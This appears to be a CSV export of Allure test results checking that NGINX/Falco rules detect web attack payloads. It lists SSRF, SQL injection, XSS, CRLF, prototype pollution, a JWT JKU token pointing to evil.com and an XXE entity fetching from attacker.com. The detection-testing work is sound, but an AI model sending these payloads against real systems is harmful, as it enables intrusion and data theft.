"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_INT_007` |
| **Name** | etcd API Key Extraction |
| **Category** | SSRF |
| **Subcategory** | internal_service |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `http://localhost:2379/v2/keys`
- **Encoded**: `http%3A%2F%2Flocalhost%3A2379%2Fv2%2Fkeys`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~23000ms
- **Timestamp**: 08:56:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_007-1772268966618-brjr4p pattern_id=SSRF_INT_007 uri=/?q=http%3A%2F%2Flocalhost%3A2379%2Fv2%2Fkeys client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_007-1772268966618-brjr4p pattern_id=SSRF_INT_007 uri=/?q=http%3A%2F%2Flocalhost%3A2379%2Fv2%2Fkeys client=127.0.0.1

**Falco Log Entry**:
```
08:56:06.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_007-1772268966618-brjr4p pattern_id=SSRF_INT_007 uri=/?q=http%3A%2F%2Flocalhost%3A2379%2Fv2%2Fkeys client=127.0.0.1
```","2","test_e2e_with_logs[616_SSRF_INT_007]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `GQL_INTRO_004` |
| **Name** | GraphQL __typename introspection query |
| **Category** | GRAPHQL |
| **Subcategory** | introspection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `__typename`
- **Encoded**: `__typename`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~71000ms
- **Timestamp**: 08:55:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX GraphQL Attack] Introspection query detected` |
| **Matched Rule** | `[NGINX GraphQL Attack] Introspection query detected test_id=GQL_INTRO_004-1772268918101-qhqy0g pattern_id=GQL_INTRO_004 uri=/?q=__typename client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX GraphQL Attack] Introspection query detected test_id=GQL_INTRO_004-1772268918101-qhqy0g pattern_id=GQL_INTRO_004 uri=/?q=__typename client=127.0.0.1

**Falco Log Entry**:
```
08:55:18.000000000: Warning [NGINX GraphQL Attack] Introspection query detected test_id=GQL_INTRO_004-1772268918101-qhqy0g pattern_id=GQL_INTRO_004 uri=/?q=__typename client=127.0.0.1
```","1","test_e2e_with_logs[620_GQL_INTRO_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_CHUNK_001` |
| **Name** | Chunked Encoding Abuse |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | chunked |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `chunked, identity`
- **Encoded**: `chunked%2C%20identity`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~37000ms
- **Timestamp**: 08:55:52.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_001-1772268952599-56g0j pattern_id=HRS_CHUNK_001 uri=/?q=chunked%2C%20identity client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_001-1772268952599-56g0j pattern_id=HRS_CHUNK_001 uri=/?q=chunked%2C%20identity client=127.0.0.1

**Falco Log Entry**:
```
08:55:52.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_001-1772268952599-56g0j pattern_id=HRS_CHUNK_001 uri=/?q=chunked%2C%20identity client=127.0.0.1
```","1","test_e2e_with_logs[470_HRS_CHUNK_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_SCHEME_002` |
| **Name** | Gopher Protocol Smuggling |
| **Category** | SSRF |
| **Subcategory** | protocol_smuggling |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `gopher://127.0.0.1:25/`
- **Encoded**: `gopher%3A%2F%2F127.0.0.1%3A25%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~27000ms
- **Timestamp**: 08:56:02.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_SCHEME_002-1772268962109-19nqpa pattern_id=SSRF_SCHEME_002 uri=/?q=gopher%3A%2F%2F127.0.0.1%3A25%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_SCHEME_002-1772268962109-19nqpa pattern_id=SSRF_SCHEME_002 uri=/?q=gopher%3A%2F%2F127.0.0.1%3A25%2F client=127.0.0.1

**Falco Log Entry**:
```
08:56:02.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_SCHEME_002-1772268962109-19nqpa pattern_id=SSRF_SCHEME_002 uri=/?q=gopher%3A%2F%2F127.0.0.1%3A25%2F client=127.0.0.1
```","1","test_e2e_with_logs[731_SSRF_SCHEME_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `FP_SEARCH_002` |
| **Name** | Normal C++ search query |
| **Category** | OTHER |
| **Subcategory** | false_positive |
| **Severity** | `INFO` |

## Attack Details

- **Payload**: `/search?q=C%2B%2B+programming`
- **Encoded**: `%2Fsearch%3Fq%3DC%252B%252B%2Bprogramming`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `NONE` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[736_FP_SEARCH_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_2ND_002` |
| **Name** | Second-order boolean injection |
| **Category** | SQLI |
| **Subcategory** | second_order |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `user' OR '1'='1' --`
- **Encoded**: `user'%20OR%20'1'%3D'1'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~90000ms
- **Timestamp**: 08:54:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1772268899138-nsunbj pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1772268899138-nsunbj pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:59.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1772268899138-nsunbj pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[002_SQLI_2ND_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_CACHE_002` |
| **Name** | Cache Poisoning via X-Original-URL CRLF |
| **Category** | CRLF |
| **Subcategory** | cache_poisoning |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `\r\nX-Original-URL:/admin`
- **Encoded**: `%0d%0aX-Original-URL%3A%2Fadmin`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~19000ms
- **Timestamp**: 08:56:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_CACHE_002-1772268970616-1dnuqc pattern_id=CRLF_CACHE_002 uri=/?q=%0d%0aX-Original-URL%3A%2Fadmin client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_CACHE_002-1772268970616-1dnuqc pattern_id=CRLF_CACHE_002 uri=/?q=%0d%0aX-Original-URL%3A%2Fadmin client=127.0.0.1

**Falco Log Entry**:
```
08:56:10.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_CACHE_002-1772268970616-1dnuqc pattern_id=CRLF_CACHE_002 uri=/?q=%0d%0aX-Original-URL%3A%2Fadmin client=127.0.0.1
```","2","test_e2e_with_logs[467_CRLF_CACHE_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_ENC_004` |
| **Name** | Lowercase Unicode CRLF with Header Injection |
| **Category** | CRLF |
| **Subcategory** | encoded_crlf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `Lowercase Unicode CRLF U+560A U+560D`
- **Encoded**: `%e5%98%8a%e5%98%8dX-Injected%3Amalicious`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 08:56:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_004-1772268967609-vh1ad8 pattern_id=CRLF_ENC_004 uri=/?q=%e5%98%8a%e5%98%8dX-Injected%3Amalicious client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_004-1772268967609-vh1ad8 pattern_id=CRLF_ENC_004 uri=/?q=%e5%98%8a%e5%98%8dX-Injected%3Amalicious client=127.0.0.1

**Falco Log Entry**:
```
08:56:07.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_004-1772268967609-vh1ad8 pattern_id=CRLF_ENC_004 uri=/?q=%e5%98%8a%e5%98%8dX-Injected%3Amalicious client=127.0.0.1
```","2","test_e2e_with_logs[553_CRLF_ENC_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BYPASS_002` |
| **Name** | Comment-based keyword WAF bypass |
| **Category** | SQLI |
| **Subcategory** | bypass_waf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `'/**/UNION/**/SELECT/**/version(),NULL,NULL--`
- **Encoded**: `'%2F**%2FUNION%2F**%2FSELECT%2F**%2Fversion()%2CNULL%2CNULL--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~91000ms
- **Timestamp**: 08:54:58.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_002-1772268898135-niqt4m pattern_id=SQLI_BYPASS_002 uri=/?q='%2F**%2FUNION%2F**%2FSELECT%2F**%2Fversion()%2CNULL%2CNULL-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_002-1772268898135-niqt4m pattern_id=SQLI_BYPASS_002 uri=/?q='%2F**%2FUNION%2F**%2FSELECT%2F**%2Fversion()%2CNULL%2CNULL-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:58.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_002-1772268898135-niqt4m pattern_id=SQLI_BYPASS_002 uri=/?q='%2F**%2FUNION%2F**%2FSELECT%2F**%2Fversion()%2CNULL%2CNULL-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[056_SQLI_BYPASS_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `JWT_JKU_001` |
| **Name** | JWT JKU injection attack |
| **Category** | JWT |
| **Subcategory** | jku_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `eyJqa3UiOiJodHRwczovL2V2aWwuY29tIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIxMjMifQ.`
- **Encoded**: `eyJqa3UiOiJodHRwczovL2V2aWwuY29tIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIxMjMifQ.`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~1000ms
- **Timestamp**: 08:56:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX JWT] JWT token attack attempt detected` |
| **Matched Rule** | `[NGINX JWT] JWT token attack attempt detected test_id=JWT_JKU_001-1772268988603-23fz4 pattern_id=JWT_JKU_001 uri=/?q=eyJqa3UiOiJodHRwczovL2V2aWwuY29tIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIxMjMifQ. client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX JWT] JWT token attack attempt detected test_id=JWT_JKU_001-1772268988603-23fz4 pattern_id=JWT_JKU_001 uri=/?q=eyJqa3UiOiJodHRwczovL2V2aWwuY29tIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIxMjMifQ. client=127.0.0.1

**Falco Log Entry**:
```
08:56:28.000000000: Warning [NGINX JWT] JWT token attack attempt detected test_id=JWT_JKU_001-1772268988603-23fz4 pattern_id=JWT_JKU_001 uri=/?q=eyJqa3UiOiJodHRwczovL2V2aWwuY29tIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIxMjMifQ. client=127.0.0.1
```","2","test_e2e_with_logs[631_JWT_JKU_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PP_JSON_001` |
| **Name** | JSON __proto__ Pollution |
| **Category** | PROTOTYPE_POLLUTION |
| **Subcategory** | json |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{""__proto__"":{""polluted"":true}}`
- **Encoded**: `%7B%22__proto__%22%3A%7B%22polluted%22%3Atrue%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~40000ms
- **Timestamp**: 08:55:49.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX PP] Prototype pollution attack attempt` |
| **Matched Rule** | `[NGINX PP] Prototype pollution attack attempt test_id=PP_JSON_001-1772268949607-paw5yh pattern_id=PP_JSON_001 uri=/?q=%7B%22__proto__%22%3A%7B%22polluted%22%3Atrue%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX PP] Prototype pollution attack attempt test_id=PP_JSON_001-1772268949607-paw5yh pattern_id=PP_JSON_001 uri=/?q=%7B%22__proto__%22%3A%7B%22polluted%22%3Atrue%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
08:55:49.000000000: Warning [NGINX PP] Prototype pollution attack attempt test_id=PP_JSON_001-1772268949607-paw5yh pattern_id=PP_JSON_001 uri=/?q=%7B%22__proto__%22%3A%7B%22polluted%22%3Atrue%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[632_PP_JSON_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `GQL_DIR_001` |
| **Name** | GraphQL directive with typename introspection |
| **Category** | GRAPHQL |
| **Subcategory** | directive |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `query{users @include(if:true){__typename}}`
- **Encoded**: `query%7Busers%20%40include(if%3Atrue)%7B__typename%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~63000ms
- **Timestamp**: 08:55:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX GraphQL Attack] Introspection query detected` |
| **Matched Rule** | `[NGINX GraphQL Attack] Introspection query detected test_id=GQL_DIR_001-1772268926619-lwljiq pattern_id=GQL_DIR_001 uri=/?q=query%7Busers%20%40include(if%3Atrue)%7B__typename%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX GraphQL Attack] Introspection query detected test_id=GQL_DIR_001-1772268926619-lwljiq pattern_id=GQL_DIR_001 uri=/?q=query%7Busers%20%40include(if%3Atrue)%7B__typename%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
08:55:26.000000000: Warning [NGINX GraphQL Attack] Introspection query detected test_id=GQL_DIR_001-1772268926619-lwljiq pattern_id=GQL_DIR_001 uri=/?q=query%7Busers%20%40include(if%3Atrue)%7B__typename%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[529_GQL_DIR_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_CSP_001` |
| **Name** | Base tag hijacking |
| **Category** | XSS |
| **Subcategory** | csp_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<base href=""https://evil.com/"">`
- **Encoded**: `%3Cbase%20href%3D%22https%3A%2F%2Fevil.com%2F%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~58000ms
- **Timestamp**: 08:55:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_CSP_001-1772268931697-nai6c pattern_id=XSS_CSP_001 uri=/?q=%3Cbase%20href%3D%22https%3A%2F%2Fevil.com%2F%22%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_CSP_001-1772268931697-nai6c pattern_id=XSS_CSP_001 uri=/?q=%3Cbase%20href%3D%22https%3A%2F%2Fevil.com%2F%22%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:31.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_CSP_001-1772268931697-nai6c pattern_id=XSS_CSP_001 uri=/?q=%3Cbase%20href%3D%22https%3A%2F%2Fevil.com%2F%22%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[160_XSS_CSP_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_015` |
| **Name** | Sleep with comment obfuscation |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/**/SLEEP/**/(5)`
- **Encoded**: `/%2A%2A/SLEEP/%2A%2A/%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~102000ms
- **Timestamp**: 08:54:47.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_015-1772268887613-zjyhm pattern_id=SQLI_TIME_015 uri=/?q=/%2A%2A/SLEEP/%2A%2A/%285%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_015-1772268887613-zjyhm pattern_id=SQLI_TIME_015 uri=/?q=/%2A%2A/SLEEP/%2A%2A/%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:47.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_015-1772268887613-zjyhm pattern_id=SQLI_TIME_015 uri=/?q=/%2A%2A/SLEEP/%2A%2A/%285%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[120_SQLI_TIME_015]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_008` |
| **Name** | Video tag XSS |
| **Category** | XSS |
| **Subcategory** | mutation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<video src=x onerror=alert('XSS')>`
- **Encoded**: `%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~65000ms
- **Timestamp**: 08:55:24.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_008-1772268924683-x2ioq pattern_id=XSS_MUT_008 uri=/?q=%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_008-1772268924683-x2ioq pattern_id=XSS_MUT_008 uri=/?q=%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:24.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_008-1772268924683-x2ioq pattern_id=XSS_MUT_008 uri=/?q=%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[190_XSS_MUT_008]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_BLIND_001` |
| **Name** | Blind XXE with External DTD |
| **Category** | XXE |
| **Subcategory** | blind_xxe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://attacker.com/xxe"">]>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~75000ms
- **Timestamp**: 08:55:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1772268914603-gbgdpw pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1772268914603-gbgdpw pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1

**Falco Log Entry**:
```
08:55:14.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1772268914603-gbgdpw pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1
```","3","test_e2e_with_logs[437_XXE_BLIND_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_FUNC_005` |
| **Name** | XPath concat function injection |
| **Category** | XPATH |
| **Subcategory** | function_abuse |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `concat(//user[1]/name,'_',//user[1]/role)`
- **Encoded**: `concat%28%2F%2Fuser%5B1%5D%2Fname%2C%27_%27%2C%2F%2Fuser%5B1%5D%2Frole%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 08:55:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_005-1772268928113-6tf3y pattern_id=XPATH_FUNC_005 uri=/?q=concat%28%2F%2Fuser%5B1%5D%2Fname%2C%27_%27%2C%2F%2Fuser%5B1%5D%2Frole%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_005-1772268928113-6tf3y pattern_id=XPATH_FUNC_005 uri=/?q=concat%28%2F%2Fuser%5B1%5D%2Fname%2C%27_%27%2C%2F%2Fuser%5B1%5D%2Frole%29 client=127.0.0.1

**Falco Log Entry**:
```
08:55:28.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_005-1772268928113-6tf3y pattern_id=XPATH_FUNC_005 uri=/?q=concat%28%2F%2Fuser%5B1%5D%2Fname%2C%27_%27%2C%2F%2Fuser%5B1%5D%2Frole%29 client=127.0.0.1
```","2","test_e2e_with_logs[587_XPATH_FUNC_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
